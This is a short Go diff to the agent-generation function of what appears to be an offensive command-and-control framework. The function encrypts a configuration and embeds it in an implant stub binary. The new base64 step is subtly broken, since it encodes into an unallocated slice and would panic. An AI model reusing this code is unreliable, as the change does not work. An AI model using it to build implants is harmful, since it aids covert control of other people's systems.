@@ -1,6 +1,7 @@
 package cc
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -58,11 +59,15 @@ func GenAgent() {
 
 	// encrypt
 	key := tun.GenAESKey(emp3r0r_data.MagicString)
-	encJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
-	if encJSONBytes == nil {
+	encryptedJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
+	if encryptedJSONBytes == nil {
 		CliPrintError("Failed to encrypt %s with key %s", EmpConfigFile, key)
 		return
 	}
+
+	// base64
+	var json_data_to_write []byte
+	base64.StdEncoding.Encode(json_data_to_write, encryptedJSONBytes)
 
 	// write
 	toWrite, err := ioutil.ReadFile(stubFile)
@@ -74,7 +79,7 @@ func GenAgent() {
 
 	// wrap the config data with magic string
 	toWrite = append(toWrite, sep...)
-	toWrite = append(toWrite, encJSONBytes...)
+	toWrite = append(toWrite, json_data_to_write...)
 	toWrite = append(toWrite, sep...)
 	err = ioutil.WriteFile(outfile, toWrite, 0755)
 	if err != nil {
